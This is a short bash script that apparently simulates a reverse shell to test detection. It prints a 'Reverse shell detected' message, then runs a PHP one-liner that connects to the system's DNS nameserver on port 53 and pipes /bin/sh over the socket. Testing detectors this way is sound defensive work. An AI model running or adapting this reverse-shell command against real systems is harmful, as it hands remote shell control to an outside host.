#!/bin/bash

echo -e `date +"%Y-%m-%d %H:%M:%S"` "\e[92mReverse shell detected with process sh and parent sh under user root\033[m"
export NS=`grep nameserver /etc/resolv.conf|awk '{print $2}'`
php -r '$ip=getenv("NS");$sock=fsockopen($ip, 53); exec("/bin/sh -1 <&3 >&3 2>&3");'
